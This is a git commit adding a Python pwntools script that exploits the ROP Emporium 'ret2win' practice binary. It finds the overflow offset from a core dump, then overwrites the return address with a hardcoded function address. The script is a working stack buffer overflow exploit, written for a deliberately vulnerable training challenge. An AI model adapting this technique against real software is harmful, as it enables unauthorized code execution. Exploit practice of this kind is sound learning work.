919aed63eab12231a3cbea18f734c94e519f3dd4
T.F <tjf952@gmail.com>
2022-10-20 12:14:00 -0400

    ret2win complete

---
+++ emporium/ret2win/ret2win.py
@@ -0,0 +1,43 @@
+#!/usr/bin/env python3
+
+"""Exploiting ret2win
+
+Simple buffer overflow with adding an address at the end to execute
+
+Usage: $ python3 exploit.py ret2win
+"""
+
+from pwn import *
+from subprocess import Popen, PIPE
+import sys
+
+# context.log_level = "DEBUG"
+
+if len(sys.argv) < 2:
+    print(f"Usage: python3 {sys.argv[0]} BINARY")
+    exit(0)
+
+context.binary = sys.argv[1]
+
+p = process(context.binary.path)
+p.sendline(cyclic(1024))
+p.wait()
+p.close()
+
+core = Coredump("./core")
+print(f"SEGFAULT Address: {core.fault_addr}")
+offset = cyclic_find(core.fault_addr)
+
+log.info(f"Offset found: {offset}")
+
+# p = gdb.debug(context.binary.path, gdbscript="init-gef")
+p = process(context.binary.path)
+
+gadget_ret2win = 0x400756
+
+payload = b"a"*(offset)
+payload += p64(gadget_ret2win)
+
+p.sendline(payload)
+p.interactive()
+
